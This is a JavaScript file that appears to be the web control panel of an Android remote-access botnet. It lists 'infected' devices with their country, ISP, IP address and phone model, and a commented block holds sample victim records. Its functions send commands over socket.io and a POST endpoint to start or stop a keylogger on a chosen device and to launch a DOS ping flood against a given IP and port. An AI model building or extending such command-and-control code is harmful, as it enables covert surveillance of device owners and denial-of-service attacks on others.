const infected = document.getElementById("infected")
const infos = document.getElementById("infos")
let CurrentDevice = ""
let CurrentAttack = ""
let devices = {}



// let devices = JSON.parse("{\"rgOU2a84CnPwXmp7AAAF\":{\"Country\":\"India\",\"ISP\":\"Reliance Jio Infocomm Limited\",\"IP\":\"49.36.217.95\",\"Brand\":\"Redmi\",\"Model\":\"M2006C3MII\",\"Manufacture\":\"Xiaomi\"},\"Xs-nnilxK574IBPrAAAH\":{\"Country\":\"India\",\"ISP\":\"Reliance Jio Infocomm Limited\",\"IP\":\"49.36.217.95\",\"Brand\":\"google\",\"Model\":\"AOSP on IA Emulator\",\"Manufacture\":\"Google\"}}" ) 

// for(var i in devices){
//     infected.insertAdjacentHTML("beforeend",`<option onclick="fetchInfo('${i}')" value="${i}">${devices[i]['Brand']} (${devices[i]['Model']})</option>`) 
// devices[i] = devices[i]
// }



function fetchInfo(id){
    stopAttack()
    CurrentDevice = id
    tmp = ""
    for(i in devices[id]){
        tmp += `<div class="info">
        <span>${i} :</span>
        <span>${devices[id][i]}</span>
    </div>` 
    }
    infos.innerHTML = tmp
}

function stopAttack(){
    // STOPING CURRENT ATTACK
    if(CurrentAttack != "" || CurrentDevice != ""){
        msgSend(CurrentDevice,CurrentAttack,"stop")
        ele = document.querySelector('input[name="attack"]:checked')
        if(ele != null){
            ele.checked = false
        }
    }
}

function DOS(val){
    if(val){
        // START DOS (PING) ATTACK
        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "  ")){
            msgSend("","ping","start",pingIp.value,pingPort.value,pingWait.value)
            pingStop.disabled = false
            pingStart.disabled = true
        }else{
            alert(42)
        }
    }else{
        msgSend("","ping","stop")
        pingStop.disabled = true
        pingStart.disabled = false
    }
}


function attack(ack){
    switch (ack) {
        case "Logger":
            CurrentAttack = "logger"
            msgSend(CurrentDevice,"logger","start")
            break;
        
        default:
            break;
    }
}


/** Loging Particals */
// Particles.init({
//     selector: '#bgParticals',
//     color : "#ffffff",
//     connectParticles : true,
//     maxParticles : 50
// });
/** Loging Particals */



/** Making Socket Connections */
const socket = io(`http://${document.location.hostname}:4000/`,{ query: "user=admin" })
const output = document.getElementById("output")


// socket.on("admin",(data)=>{
//     console.log(data)
//     output.append(data+"\n")
// })

socket.on("logger",(data)=>{
    console.log(data)
    output.append(data+"\n")
})

socket.on("info",(data)=>{
    // data = JSON.parse(data)
    // console.log(data)
    infected.innerHTML = '<option data-display="Infected">None</option>'
    data.forEach(i=>{
        infected.insertAdjacentHTML("beforeend",`<option onclick="fetchInfo('${i[0]}')" value="${i[0]}">${i[1]} (${i[2]})</option>`) 
    })
    // devices[id] = data
})

socket.on("")


/** Making Socket Connections */



/** Functions */
function msgSend(id,emit,...args){
    // console.log(args)
    $.ajax({
        url : document.location.origin+'/send',
        method : 'POST',
        type : 'POST',
        data : {
            emit : emit,
            id : id,
            args : JSON.stringify(args)
        },
        success : (data)=>{
            console.log(data)
        }
    })
}

// $(document).ready(function(){
//     $('select').niceSelect()
// })
